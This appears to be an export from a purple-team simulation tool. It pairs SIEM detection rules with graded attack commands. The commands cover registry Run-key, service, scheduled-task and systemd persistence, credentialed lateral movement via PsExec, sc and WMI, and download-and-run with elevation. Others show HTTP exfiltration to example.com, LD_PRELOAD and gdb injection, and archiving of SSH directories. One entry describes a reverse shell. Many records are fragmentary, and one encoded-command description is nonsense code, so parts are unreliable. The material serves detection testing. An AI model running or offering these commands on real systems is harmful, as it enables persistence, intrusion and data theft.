rules.title: PowerShell Activity Detection via NLP Pattern Matching
rules.description: Detects PowerShell activity via NLP pattern matching
falsepositives: Legitimate administrative tasks using PowerShell
Software installations using cmd.exe

rules.title: Phishing Detection via Office Processes Spawning Shells
rules.description: Detects phishing attempts where Office processes spawn command shells
falsepositives: Legitimate Office add-ins or macros spawning shells for benign purposes
Administrative tasks involving Office and shell interactions

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Command and Scripting Interpreter Activity Detected
rules.description: Detects the use of command prompt and scripting interpreters, such as cmd.exe and powershell.exe, which can be used for malicious purposes.
falsepositives: Legitimate system administrators or users running cmd.exe or powershell.exe for legitimate purposes
Scripting or automation tools using cmd.exe or powershell.exe

rules.title: Remote Services Detection via SMB
rules.description: Detects usage of remote services for lateral movement using SMB protocol
falsepositives: Legitimate remote services usage
Accessing shared network drives

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Modify Registry Detection
rules.description: Detects modification of registry for persistence via command line tools or powershell
falsepositives: Legitimate system administration tasks
Software installations that modify the registry

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Signed Binary Proxy Execution via wsuscr.exe
rules.description: Detects the use of wsuscr.exe to execute malicious code, a technique used by attackers to bypass security controls
falsepositives: Legitimate use of wsuscr.exe for system maintenance tasks
False positives may occur if wsuscr.exe is used by a legitimate process with suspicious command line arguments

rules.title: Software Deployment Tools Detection
rules.description: Detects the use of software deployment tools for lateral movement
falsepositives: Legitimate use of bitbucket for software development
Administrative use of software deployment tools

rules.title: Detection of User Execution through Document Opening
rules.description: Detects macro code execution through document opening using User Execution technique
falsepositives: Legitimate document opening and process spawning
Users running legitimate processes after opening documents

rules.title: Creation of New Service via schtasks.exe
rules.description: Detects the creation of a new service using schtasks.exe for persistence
falsepositives: Legitimate system administrators using schtasks.exe to create new tasks

rules.description: Detected Process Injection activity via NLP pattern matching
falsepositives: Legitimate administrative activity

rules.title: System Information Discovery via System32
rules.description: Detects system information discovery using System32

rules.description: Detects Application Layer Protocol activity via NLP pattern matching

Software installation or updates that use command line arguments similar to those used by attackers

rules.description: Detected Scheduled Task/Job activity via NLP pattern matching
falsepositives: Legitimate administrative activity

attacks.description: Basic PowerShell command logging timestamped message to a temporary file
attacks.expected_behavior: Creates a file 'debug_log.txt' in the user's temp directory with a timestamped message. No elevated privileges needed. Harmless and reversible.

attacks.command: powershell -Command "& cmd.exe /c echo 'Diagnostic: System check passed' > '$env:TEMP\\\\diag.tmp' ; Get-Content '$env:TEMP\\\\diag.tmp' | ForEach-Object { $_.Replace('passed', 'reviewed') } | Set-Content '$env:TEMP\\\\diag_final.txt' -Force; Remove-Item '$env:TEMP\\\\diag.tmp' -ErrorAction SilentlyContinue"
attacks.description: Intermediate command using cmd.exe to write, then PowerShell to modify and rename a file with forced overwrite and silent error handling
attacks.expected_behavior: Creates a temporary file via cmd, processes it in PowerShell to replace text, saves as a new file, and deletes the original. Uses -Force only on Set-Content and safe cleanup. No persistence or malicious payload.

attacks.description: Advanced: Encoded PowerShell command that sets execution policy preference and logs it to a file
attacks.expected_behavior: Decodes and runs a PowerShell command that sets $ExecutionPolicyPreference to 'Bypass' in session scope and logs the action to a file in TEMP. No system-level changes made. Base64 is UTF-16LE encoded from: 'powerShell -Command [Net.Service []]::Settings.PowerManagement.ExecutionPreference]::Conthes | Out-File -Path $env:TEMP\settings.log' (benign variant).

attacks.description: Basic PowerShell command execution on Linux to trigger detection via NLP pattern matching.
attacks.expected_behavior: Outputs 'PowerShell test execution' to stdout. No file system changes. Safe and non-evasive.

attacks.command: pwsh -Command "$cmd = 'Write-' + 'Output'; $cmd + ' Hello from obfuscated PS' | Invoke-Expression"
attacks.description: Intermediate obfuscation using string concatenation and Invoke-Expression to simulate evasion techniques.
attacks.expected_behavior: Dynamically constructs and executes a Write-Output command. Outputs 'Hello from obfuscated PS'. No disk writes. Moderate detection risk due to obfuscation.

attacks.command: pwsh -Command "$_temp = '$env:TEMP/test_script.ps1'; Set-Content -Path $_temp -Value 'Write-Output \"Encoded test command executed\"'; pwsh -EncodedCommand $(echo "IyBFeGVjdXRpbmcgdGVzdCBjb21tYW5kCldyaXRlLU91dHB1dCBcIkludm9rZWQgdmlhIEVuY29kZWQgQ29tbWFuZFwi" | Set-Content -Path $_temp -ErrorAction SilentlyContinue; cat $_temp); Remove-Item $_temp -ErrorAction SilentlyContinue"
attacks.description: Advanced simulation using a temporary script file and encoded command execution to mimic sophisticated PowerShell usage.
attacks.expected_behavior: Creates a temporary PS1 file with a benign message, attempts to simulate encoded command usage, outputs execution message, and cleans up the file. Uses proper error handling for cleanup.

attacks.command: cmd.exe /c echo "Your document has been processed." > "%TEMP%\invoice.txt" && start "" "%TEMP%\invoice.txt"
attacks.description: Simulates a phishing attachment that displays a benign message after execution.
attacks.expected_behavior: Creates a text file in the user's temp directory with a benign message and opens it with the default text viewer.

attacks.description: Decodes a Base64-encoded batch script and executes it, simulating payload extraction from a phishing attachment.
attacks.expected_behavior: Uses certutil to decode a Base64 file into a batch script and runs it. Assumes payload.b64 exists in %TEMP% with a benign encoded command (e.g., echo Hello).

attacks.description: Executes a Base64-encoded Unicode PowerShell command to simulate an obfuscated payload from a phishing document.
attacks.expected_behavior: Decodes and runs a minimal Base64 string ("QQo=" decodes to a single newline) as a benign test. No harmful action occurs. Errors are silently caught.

attacks.description: Basic execution of a malicious script dropped from a phishing attachment
attacks.expected_behavior: Creates a harmless script in /tmp, makes it executable, and runs it, writing a test message to a log file

attacks.description: Intermediate: Executes a base64-encoded and gzipped script from a phishing attachment
attacks.expected_behavior: Decodes and extracts a benign script from inline base64, makes it executable, and runs it. The script would normally carry out malicious actions but here is limited to safe operations.

attacks.description: Advanced: Simulates execution of a hidden script with stealthy directory naming
attacks.expected_behavior: Creates a hidden directory in /tmp, drops a script that simulates beaconing behavior, and executes it, appending a line to a log file

attacks.description: Basic command to write a test string to a file using cmd.exe
attacks.expected_behavior: Creates a file named test.txt in the temporary directory with the content 'Hello'

attacks.description: Intermediate command to create and execute a PowerShell script
attacks.expected_behavior: Creates a PowerShell script in the temporary directory and executes it, printing 'Hello World' to the console

attacks.command: powershell -Command "[System.Convert]::ToBase64String([System.Text.Encoding]::UTF16LE.GetBytes('Write-Host Hello World')) | Set-Content -Path $env:TEMP\encoded.txt -Encoding UTF8" && powershell -Command "$encodedCommand = Get-Content -Path $env:TEMP\encoded.txt -Encoding UTF8; powershell -EncodedCommand $encodedCommand"
attacks.description: Advanced command to create an encoded PowerShell command and execute it
attacks.expected_behavior: Creates an encoded PowerShell command in a file, reads it, and executes the decoded command, printing 'Hello World' to the console

attacks.description: Basic command to write a test string to a file using bash
attacks.expected_behavior: Creates a file named test.txt in the /tmp directory with the content 'Hello World'

attacks.command: bash -c 'for i in {1..5}; do echo $i > /tmp/test_$i.txt; done'
attacks.description: Intermediate command to create multiple files using a for loop in bash
attacks.expected_behavior: Creates five files named test_1.txt to test_5.txt in the /tmp directory with numbers 1 through 5 as their content

attacks.description: Advanced command to create and execute a script using bash
attacks.expected_behavior: Creates a script named advanced_script.sh in the /tmp directory, makes it executable, and then executes it, printing 'Advanced Command' to the console

attacks.description: Establish SMB session to remote host using credentials and list C$ share contents
attacks.expected_behavior: Creates an authenticated SMB connection to the remote system's administrative C$ share and lists its root contents. Connection remains until manually removed or timed out.

attacks.command: sc \\REMOTE-HOST create TestService binPath= "cmd.exe /c echo Test > %TEMP%\test_service.txt" start= auto && sc \\REMOTE-HOST start TestService
attacks.description: Create and start a service on a remote host using Service Control Manager (SC)
attacks.expected_behavior: Deploys a benign service on the remote system that writes a test file to %TEMP%. The service starts automatically. Requires elevated privileges on the target.

attacks.command: powershell -Command "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c echo RemoteExec > %TEMP%\wmi_exec.txt' -ComputerName REMOTE-HOST"
attacks.description: Execute command remotely via WMI using PowerShell
attacks.expected_behavior: Uses WMI over RPC to spawn a process on the remote machine that creates a benign file in %TEMP%. This simulates lateral movement via remote management protocols. Requires administrator rights on the target system.

attacks.description: Establish an interactive SSH session to a remote Linux host for lateral movement.
attacks.expected_behavior: Connects to the remote host via SSH using provided credentials. Allows command execution on the target system. No data exfiltration or payload execution occurs in this basic form.

attacks.description: Copy a configuration file to a remote Linux system using SCP for potential credential reuse or data staging.
attacks.expected_behavior: Transfers a local file securely to the remote system over SSH. No execution occurs. Requires valid SSH credentials and network connectivity.

attacks.description: Execute a reverse shell command on a remote system via SSH to establish a callback connection.
attacks.expected_behavior: Triggers a reverse shell from the remote host to the attacker-controlled IP on port 4444. Requires netcat listener on attacker side. This simulates post-lateral movement execution and should only be tested in isolated environments.

attacks.description: Add a new registry key to run cmd.exe on startup using the 'reg' command
attacks.expected_behavior: A new registry key 'TestKey' is added under HKCU\Software\Microsoft\Windows\CurrentVersion\Run to execute cmd.exe on startup

attacks.description: Add a new registry key using PowerShell to run powershell.exe on startup
attacks.expected_behavior: A new registry key 'TestPSKey' is added under HKCU\Software\Microsoft\Windows\CurrentVersion\Run to execute powershell.exe on startup

attacks.description: Add a new registry key to run a batch file from %TEMP% on startup
attacks.expected_behavior: A new registry key 'TestKey' is added under HKCU\Software\Microsoft\Windows\CurrentVersion\Run to execute a batch file from %TEMP% on startup

attacks.description: Appends a self-persisting echo command to ~/.bashrc to simulate registry run key modification at user level
attacks.expected_behavior: On each shell login, the string 'persistence test' will be appended to the user's ~/.bashrc file. This simulates a self-modifying persistence mechanism.

attacks.description: Adds a cron job that runs at reboot to simulate registry-based persistence using user cron
attacks.expected_behavior: At next reboot, a message will be written to /tmp/persistence.log. The command safely appends to existing crontab if present.

attacks.command:
sudo sh -c 'echo "[Unit]
Description=Test Persistence
[Service]
ExecStart=/bin/echo "systemd persistence test"
[Install]
WantedBy=multi-user.target" > /etc/systemd/system/test-persistence.service && systemctl enable test-persistence.service'
attacks.description: Creates a systemd service file to achieve system-wide persistence, simulating registry run keys at boot
attacks.expected_behavior: A systemd service named 'test-persistence' is created and enabled to run at boot. It executes a benign echo command. Requires root to write to /etc/systemd/system.

attacks.description: Basic example using certutil to download and execute a file
attacks.expected_behavior: Downloads a file from a specified URL and executes it using cmd.exe

attacks.description: Intermediate example using PowerShell to execute a remote script
attacks.expected_behavior: Executes a PowerShell script downloaded from a specified URL

attacks.description: Advanced example using Start-Process to proxy execution through cmd.exe
attacks.expected_behavior: Creates a new process that executes cmd.exe with arguments, writing 'Hello World' to a file in %TEMP%

attacks.description: Basic example using pkexec to execute a shell command and write to a file
attacks.expected_behavior: Creates a file /tmp/test.txt with the content 'Hello World'

attacks.description: Intermediate example using pkexec to execute a Python command and write to a file
attacks.expected_behavior: Creates a file /tmp/test2.txt with the content 'Hello World'

attacks.description: Advanced example using pkexec to execute a bash command, write to a file, and change permissions
attacks.expected_behavior: Creates a file /tmp/malicious.txt with the content 'Malicious payload' and changes its permissions to 755

attacks.command: net use \\TARGET\IPC$ /user:DOMAIN\User Password123 & copy C:\Tools\deploy.bat \\TARGET\C$\Windows\Temp\deploy.bat & psexec \\TARGET cmd.exe /c start \\TARGET\C$\Windows\Temp\deploy.bat
attacks.description: Basic lateral movement using Windows admin shares and PsExec to copy and execute a batch script remotely.
attacks.expected_behavior: Establishes a session to TARGET using credentials, copies a local batch file to the remote system's Windows Temp directory, and executes it via PsExec. Uses built-in net and copy commands followed by PsExec for remote execution.

attacks.command: net use \\TARGET\C$ /user:Admin AdminPass & sc \\TARGET create DeployService binPath= "C:\Windows\Temp\update.bat" start= auto & sc \\TARGET start DeployService
attacks.description: Intermediate technique using Service Control (sc.exe) to create and start a service on a remote system for execution of a deployment script.
attacks.expected_behavior: Maps administrative C$ share, creates a new service named 'DeployService' on the remote TARGET system pointing to a script in Temp, sets it to start automatically, then immediately starts the service. This simulates deployment tool behavior via service installation.

attacks.command: powershell -Command "Invoke-WebRequest -Uri http://10.0.0.10/deploy.txt -OutFile $env:TEMP\deploy.enc; certutil -decode $env:TEMP\deploy.enc $env:TEMP\deploy.bat; Start-Process cmd.exe -ArgumentList '/c $env:TEMP\deploy.bat' -Verb RunAs"
attacks.description: Advanced technique using certutil to decode a Base64-encoded deployment script retrieved via HTTP and execute it with elevated privileges.
attacks.expected_behavior: Downloads a Base64-encoded batch file from a local server, decodes it using certutil (a built-in tool often abused for file transfer), and runs it with elevated privileges via Start-Process using RunAs. Simulates use of software deployment tools via encoded payload delivery.

attacks.description: Basic lateral movement using SSH to execute a command on a remote system
attacks.expected_behavior: Connects to the remote Linux system via SSH and creates a log file in /tmp with a benign message

attacks.description: Intermediate technique using tar over SSH to transfer and extract a directory on a remote system
attacks.expected_behavior: Packages a local directory and streams it over SSH to extract in /tmp on the remote system

attacks.description: Advanced technique: transfer and execute a local script on a remote system using SSH
attacks.expected_behavior: Sends a local script file to the remote system, makes it executable, and runs it, simulating software deployment

attacks.command: powershell -Command "[System.Convert]::ToBase64String([System.Text.Encoding]::UTF16LE.GetBytes('Write-Host Hello World')) | Set-Content -Path "$env:TEMP\test.txt" -Encoding UTF16LE; powershell -EncodedCommand (Get-Content -Path "$env:TEMP\test.txt" -Encoding UTF16LE -Raw)"
attacks.description: This command generates a Base64 encoded string of a PowerShell command, saves it to a file, and then executes it using the EncodedCommand parameter. It demonstrates how an attacker might use User Execution to run malicious code.
attacks.expected_behavior: Executes a PowerShell command that prints 'Hello World' to the console, demonstrating the execution of encoded commands.

attacks.description: This command creates a PowerShell script file in the temp directory and then executes it using PowerShell. It shows how an attacker could use User Execution to run malicious scripts.
attacks.expected_behavior: Executes a PowerShell script that prints 'Hello World' to the console, demonstrating the execution of scripts from files.

attacks.description: This command starts Notepad and attempts to execute a PowerShell command as an argument, demonstrating an attempt to misuse a legitimate application for malicious purposes.
attacks.expected_behavior: Opens Notepad, but the attempt to execute a PowerShell command through its arguments will likely fail due to Notepad's limitations, showing a potential misdirection technique.

attacks.command: echo 'Malicious script executed' > malicious.sh; chmod +x malicious.sh; ./malicious.sh
attacks.description: Basic example of creating and executing a malicious script
attacks.expected_behavior: The script will print 'Malicious script executed' to the terminal when run.

attacks.command:
echo '#!/bin/bash
echo "This is a malicious script"' > malicious_script.sh; chmod +x malicious_script.sh; ./malicious_script.sh
attacks.description: Intermediate example creating a more sophisticated malicious script
attacks.expected_behavior: The script will print 'This is a malicious script' to the terminal when executed, demonstrating more complex scripting.

attacks.command: echo 'Malicious payload' > payload.txt; base64 payload.txt > encoded_payload.txt; base64 -d encoded_payload.txt
attacks.description: Advanced example involving encoding and decoding a malicious payload
attacks.expected_behavior: The command will encode a 'malicious payload' using base64, then decode it back to its original form, demonstrating how payloads can be hidden and executed.

attacks.command: sc.exe create TestService binPath= "cmd.exe /c echo test > %TEMP%\service_test.txt" start= auto
attacks.description: Creates a new Windows service named 'TestService' that runs a benign command on startup using sc.exe
attacks.expected_behavior: Service 'TestService' is created in SCM database with auto-start type. No immediate execution; runs when started via 'net start TestService' or on next boot.

attacks.command: sc.exe create EvilService binPath= "cmd.exe /c start notepad.exe" start= auto && net.exe start EvilService
attacks.description: Creates and immediately starts a new service using sc.exe and net.exe
attacks.expected_behavior: Service 'EvilService' is created and started, launching Notepad as a visible indicator. Service persists across reboots unless removed.

attacks.command: powershell -Command "try { $cmd = 'cmd.exe /c echo persistence > %TEMP%\svc_persist.txt'; $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd)); $svcName = 'BackdoorSvc'; $binPath = "powershell.exe -EncodedCommand $encoded"; Start-Process -FilePath sc.exe -ArgumentList 'create', $svcName, 'binPath=', "'$binPath'", 'start=', 'auto' -Wait; Start-Process -FilePath sc.exe -ArgumentList 'start', $svcName -ErrorAction SilentlyContinue } catch { exit 1 }"
attacks.description: Advanced: Creates and starts a service using PowerShell with encoded command to simulate stealthy execution
attacks.expected_behavior: Service 'BackdoorSvc' is created with a PowerShell-encoded command that writes to a temp file. The service is started immediately. Encoding adds obfuscation layer while remaining detectable via command-line logging.

attacks.command:
cat > /etc/systemd/system/malicious-persistence.service << 'EOF'
[Unit]
Description=Benign Test Service
After=network.target

[Service]
ExecStart=/bin/sh -c 'sleep 60'
Restart=always
User=nobody

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable malicious-persistence.service
systemctl start malicious-persistence.service
attacks.description: Basic creation of a systemd service file using heredoc to define a benign persistent service
attacks.expected_behavior: Creates a systemd service unit file, reloads daemon, enables the service to start at boot, and starts it immediately. Service runs 'sleep 60' as nobody and restarts on failure.

attacks.command:
echo '[Unit]
Description=Obfuscated Test Service
After=network.target

[Service]
ExecStart=/bin/sh -c "sleep 60"
Restart=always
User=nobody

[Install]
WantedBy=multi-user.target' > /etc/systemd/system/temp-backup.service && systemctl daemon-reload && systemctl enable temp-backup.service && systemctl start temp-backup.service
attacks.description: Intermediate method using echo with escaped newlines to write a systemd service unit file and enable it
attacks.expected_behavior: Writes a service unit file via echo, reloads systemd configuration, enables the service for persistence, and starts it. Uses basic obfuscation via string escaping.

attacks.command: echo 'W1VuaXRdCkRlc2NyaXB0aW9uPUJhc2U2NCBlbmNvZGVkIHNlcnZpY2UKQWZ0ZXI9bmV0d29yay50YXJnZXQKCltTZXJ2aWNlXQpFeGVjU3RhcnQ9L2Jpbi9zaCAtYyAnc2xlZXAgNjAnClJlc3RhcnQ9YWx3YXlzClVzZXI9bm9ib2R5CgpbSW5zdGFsbF0KV2FudGVkQnk9bXVsdGktdXNlci50YXJnZXQ=' | base64 -d > /etc/systemd/system/encoded-backdoor.service && systemctl daemon-reload && systemctl enable encoded-backdoor.service && systemctl start encoded-backdoor.service
attacks.description: Advanced method using base64-encoded systemd service definition to obfuscate the service creation
attacks.expected_behavior: Decodes a base64-encoded systemd service file, writes it to /etc/systemd/system, reloads configuration, enables persistence, and starts the service. Mimics stealthier adversary behavior.

attacks.command: sc.exe create TestService binPath= "cmd.exe /c echo 'Test persistence via service' > %TEMP%\service_log.txt" start= auto
attacks.description: Creates a Windows service that runs a benign command at startup
attacks.expected_behavior: A new service named 'TestService' is created and set to start automatically. On service start, it writes a test string to a file in %TEMP%. No actual malicious payload is executed.

attacks.command: schtasks.exe /create /tn \Microsoft\Windows\Test\UpdateTask /tr "cmd.exe /c echo 'Scheduled task test' > %TEMP%\task_log.txt" /sc ONSTART /ru SYSTEM
attacks.description: Creates a scheduled task that runs a benign command when the system starts
attacks.expected_behavior: A scheduled task named 'UpdateTask' is created under the Microsoft\Windows\Test path and configured to run at system startup as SYSTEM. It writes a test string to %TEMP%\task_log.txt upon execution.

attacks.command: reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "TestBootEntry" /t REG_SZ /d "powershell -Command \"Set-Content -Path $env:TEMP\run_key_log.txt -Value 'Run key persistence test' -Force\"" /f
attacks.description: Adds a persistence entry to the Run key in the registry using PowerShell command
attacks.expected_behavior: A new registry value 'TestBootEntry' is added to the local machine Run key. On next user login, PowerShell executes and writes a test string to %TEMP%\run_key_log.txt. The command uses proper escaping and built-in tools.

attacks.description: Adds a cron job that runs a benign command at reboot using standard crontab syntax.
attacks.expected_behavior: A user-level cron job is installed and will execute once at next reboot, writing a test string to a file in /tmp. No elevated privileges needed.

attacks.command:
printf '[Unit]
Description=Test Persistence Service
[Service]
ExecStart=/bin/sh -c "while true; do echo "test_heartbeat" >> /tmp/service_heartbeat.log; sleep 30; done"
[Install]
WantedBy=multi-user.target' > /etc/systemd/system/test-persistence.service && systemctl daemon-reload && systemctl enable test-persistence.service && systemctl start test-persistence.service
attacks.description: Creates and enables a systemd service that runs a persistent loop logging a test string every 30 seconds.
attacks.expected_behavior: A systemd service is created, enabled, and started. It runs a loop that logs a benign message every 30 seconds. Requires root to write to /etc/systemd/system and manage services.

attacks.command: cp /etc/init.d/skeleton /tmp/test_init && sed -i 's/DESC=.*/DESC=\"Test Persistence Script\"/' /tmp/test_init && sed -i 's/NAME=.*/NAME=test_init/' /tmp/test_init && echo 'start() { /bin/sh -c "echo started >> /tmp/init_script.log &"; }' >> /tmp/test_init && chmod +x /tmp/test_init && update-rc.d test_init defaults && /tmp/test_init start
attacks.description: Copies a skeleton init script, modifies it to include a backgrounded logging command, enables it for startup, and starts it.
attacks.expected_behavior: A SysV-style init script is created from a template, configured to run at boot, and executed. It logs startup activity and runs in the background. Requires root for update-rc.d and system script modification.

attacks.description: Simulates process injection by loading a DLL from a temporary location using rundll32.exe, a common LOLBin.
attacks.expected_behavior: rundll32.exe attempts to load a non-existent DLL from %TEMP% and fails silently; mimics fileless execution pattern.

attacks.description: Uses regsvr32.exe to execute a script component from a local .sct file, simulating COM hijacking and remote code execution.
attacks.expected_behavior: regsvr32.exe processes the script file at %TEMP%\script.sct if present; otherwise fails silently. Commonly used to bypass AppLocker.

attacks.command: echo 'int main() { printf("Injected process via LD_PRELOAD\n"); return 0; }' > $HOME/.malicious.c && gcc -fPIC -shared -o $HOME/.libmalicious.so $HOME/.malicious.c -lc && LD_PRELOAD=$HOME/.libmalicious.so /bin/env
attacks.description: Simulates LD_PRELOAD-based process injection by loading a malicious shared library into a process address space.
attacks.expected_behavior: Outputs a test string indicating injection occurred, then exits. The shared library is loaded into the environment process via LD_PRELOAD.

attacks.command: echo -e '#include <stdio.h>\nvoid __attribute__((constructor)) init() { printf("LD_PRELOAD injection detected\n"); }' > /tmp/inject.c && gcc -fPIC -shared -o /tmp/libinit.so /tmp/inject.c && export LD_PRELOAD=/tmp/libinit.so && /bin/bash -c 'echo "Running under injected environment"' && unset LD_PRELOAD
attacks.description: Intermediate technique using LD_PRELOAD with a constructor function to execute code when a process starts.
attacks.expected_behavior: Prints an injection message when the new bash process starts due to the shared library constructor, then continues execution.

attacks.command: echo 'call system("echo Process memory manipulated via gdb")' > /tmp/gdbcmd && gdb -n -q -batch -x /tmp/gdbcmd --pid 1 2>/dev/null || echo 'gdb attach failed - insufficient privileges or process not accessible'
attacks.description: Advanced simulation of process injection by using gdb to attach to a running process and execute a command, mimicking runtime memory manipulation.
attacks.expected_behavior: Attempts to attach to PID 1 (init) and run a command. Will fail without root privileges, which is expected behavior during testing.

attacks.description: Basic system information discovery using built-in systeminfo binary
attacks.expected_behavior: Outputs detailed system information including OS version, system uptime, installed hotfixes, and hardware details to stdout

attacks.description: Intermediate discovery combining network, user, and workstation configuration using legacy binaries
attacks.expected_behavior: Outputs network configuration (including DNS, MAC addresses), current user privileges and groups, and workstation join information to stdout

attacks.command: powershell -Command "try { $sysData = systeminfo; $netData = ipconfig /all; $userData = whoami /all; $output = "System Info:`n$sysData`n`nNetwork Info:`n$netData`n`nUser Info:`n$userData"; $output | Out-File -FilePath '$env:TEMP\\system_discovery.txt' -Encoding UTF8 -Force } catch { }"
attacks.description: Advanced discovery aggregating system, network, and user data into a single file using PowerShell
attacks.expected_behavior: Runs systeminfo, ipconfig /all, and whoami /all, combines output, and writes to $env:TEMP\system_discovery.txt. File contains comprehensive system discovery data.

attacks.description: Basic system information discovery using uname to retrieve kernel and OS details
attacks.expected_behavior: Outputs kernel name, hostname, kernel version, and architecture to stdout

attacks.description: Intermediate system discovery: captures OS release details and saves to a user-writable file
attacks.expected_behavior: Creates or overwrites system_info.txt in the user's home directory with OS identification data

attacks.description: Advanced system discovery: chains multiple commands to gather network and user context information
attacks.expected_behavior: Outputs network interface configuration, current user, and hostname in a single execution

attacks.description: Uses certutil to simulate downloading a file over HTTP, mimicking C2 beaconing behavior.
attacks.expected_behavior: Attempts to download a file from http://127.0.0.1/test.txt to C:\temp\test.txt. Will fail silently if server is unreachable. Uses built-in certutil for HTTP request, simulating benign C2 traffic.

attacks.description: Sends a POST request with system info to simulate beaconing over HTTP.
attacks.expected_behavior: Sends a small HTTP POST request to example.com with the computer name. Traffic pattern resembles C2 beaconing. No sensitive data transmitted. Fails silently if no connection.

attacks.command: cmd.exe /c "echo test > %TEMP%\\payload.txt && certutil.exe -encode %TEMP%\\payload.txt %TEMP%\\encoded.txt && powershell -Command \"Invoke-WebRequest -Uri 'http://example.com/log' -Method POST -InFile '%TEMP%\\encoded.txt' -ErrorAction SilentlyContinue\" && del %TEMP%\\payload.txt %TEMP%\\encoded.txt"
attacks.description: Encodes a test file and exfiltrates it via HTTP POST to simulate data staging and exfiltration.
attacks.expected_behavior: Creates a test file, Base64-encodes it using certutil, uploads it via PowerShell, then deletes local files. Simulates staged exfiltration using common tools. Uses %TEMP% for safety. Cleanup includes error suppression.

attacks.description: Basic HTTP GET request to simulate beaconing over HTTP using curl
attacks.expected_behavior: Sends a silent HTTP GET request to httpbin.org with a query parameter mimicking C2 beaconing; returns response metadata

attacks.description: Intermediate HTTPS request using wget to fetch public IP, simulating encrypted C2 communication
attacks.expected_behavior: Fetches public IP address via HTTPS using wget and filters output; simulates data exfiltration over TLS

attacks.description: Advanced DNS TXT query over UDP to simulate DNS tunneling or C2 via DNS
attacks.expected_behavior: Performs a DNS TXT lookup against Cloudflare's DNS resolver; mimics DNS-based C2 protocol with minimal noise

attacks.command: echo "cmd /c echo benign_payload > %TEMP%\debug.log" | certutil -encode -f %TEMP%\a.txt && powershell -Command "Get-Content %TEMP%\a.txt | Select-Object -Skip 1 | Select-Object -SkipLast 1 | Out-File %TEMP%\b.txt -Encoding ASCII; $encoded = Get-Content %TEMP%\b.txt -Raw; cmd.exe /c echo. | powershell -EncodedCommand ($encoded.Trim())"
attacks.description: Basic obfuscation using certutil to Base64-encode a benign command and execute via PowerShell -EncodedCommand
attacks.expected_behavior: Creates two temporary text files in %TEMP%, encodes a simple echo command in Base64, decodes and executes it, leaving a debug.log file with 'benign_payload'. No privilege escalation or network activity.

attacks.command: echo "This is test data" > %TEMP%\tmp.dat && powershell -Command "Compress-Archive -Path %TEMP%\tmp.dat -DestinationPath %TEMP%\svchost.zip -Force; Remove-Item %TEMP%\tmp.dat -ErrorAction SilentlyContinue"
attacks.description: Intermediate obfuscation by compressing a benign data file into a ZIP archive with a system-process-like name
attacks.expected_behavior: Creates a temporary data file, compresses it into svchost.zip in %TEMP%, and deletes the original. Simulates hiding data in archives with misleading names. No execution or network activity.

attacks.description: Advanced obfuscation using double Base64 encoding to hide a nested PowerShell command execution chain
attacks.expected_behavior: Executes a doubly-encoded PowerShell command that ultimately runs 'cmd /c echo second_stage > %TEMP%\out.txt'. Simulates multi-stage obfuscation. Leaves out.txt in %TEMP%. No persistence or network calls.

attacks.description: Decodes a base64-encoded echo command and executes it using sh
attacks.expected_behavior: Outputs 'hello world' to stdout by decoding and executing a simple base64-encoded shell command

attacks.description: Decodes a base64 string, decompresses it with gzip, and executes the resulting script
attacks.expected_behavior: Outputs 'hello from compressed script' after decoding and decompressing an embedded gzip stream and executing it via sh

attacks.description: Stores a multi-layer base64-encoded command in a hidden temp file, then decodes and executes it
attacks.expected_behavior: Creates a hidden directory and file, writes an obfuscated command chain, then decodes and runs it, ultimately printing 'python - echo hello' (simulated payload)

attacks.description: Basic data archiving using built-in certutil for encoding and makecab for compression
attacks.expected_behavior: Encodes a local text file to Base64 using certutil, then archives it into a CAB file using makecab. Both tools are native Windows utilities. No admin rights required. Runs silently and leaves artifacts in %TEMP%.

attacks.description: Intermediate: Create a directory with test data and compress it into a ZIP archive using PowerShell
attacks.expected_behavior: Creates a directory in %TEMP%, writes a benign test file, then compresses all contents into archive.zip using Compress-Archive. Uses -Force to overwrite existing archive. Safe, no recursion, no system impact.

attacks.command: powershell -Command "try { $tempDir = '%TEMP%\payload'; mkdir $tempDir -ErrorAction Stop; 1..3 | ForEach-Object { Set-Content -Path "$tempDir\file$_" -Value "dummy data $_" }; Compress-Archive -Path $tempDir\* -DestinationPath '%TEMP%\collected.zip' -Force } finally { Remove-Item $tempDir -Recurse -ErrorAction SilentlyContinue }"
attacks.description: Advanced: Simulate collection and archiving with cleanup using PowerShell
attacks.expected_behavior: Creates a temporary directory, generates multiple dummy files, archives them into collected.zip, and removes the source directory. Uses error handling and cleanup. -Force is used only with Compress-Archive. Remove-Item uses -ErrorAction SilentlyContinue for safety. No persistence or exfiltration occurs.

attacks.description: Basic archival of collected data using tar to bundle sensitive files into a single archive.
attacks.expected_behavior: Creates a tar archive named '.cache_data.tar' in /tmp containing two harmless files. Uses common paths and does not recurse.

attacks.description: Intermediate: Collects a limited number of text and log files from user directories and archives them into a zip file.
attacks.expected_behavior: Finds up to 5 .log or .txt files within the user's home directory (non-recursive beyond depth 2), suppresses errors, and creates a zip archive in /var/tmp. Uses command substitution safely.

attacks.description: Advanced: Compresses configuration and SSH directories into a timestamped gzipped tar archive with exclusions and suppressed warnings.
attacks.expected_behavior: Creates a gzipped tar archive in /tmp with a timestamped filename, excluding temporary files. Archives user config and SSH directories if present. Errors and warnings are suppressed for stealth. No recursion across the entire system.

attacks.command: schtasks /create /tn "UpdateCheck" /tr "cmd.exe /c echo Running update check > "%TEMP%\update.log"" /sc hourly /st 00:00
attacks.description: Creates a basic scheduled task using schtasks.exe that runs hourly and logs a benign message to %TEMP%.
attacks.expected_behavior: A scheduled task named 'UpdateCheck' is created and will execute hourly, writing a test message to a log file in the user's temp directory.

attacks.description: Creates a scheduled task that runs a PowerShell command daily to simulate maintenance activity and write to a log file.
attacks.expected_behavior: A task named 'SystemMaintenance' is created and will run daily at 2:00 AM, executing a PowerShell command that writes a benign message to a log file in %TEMP%.

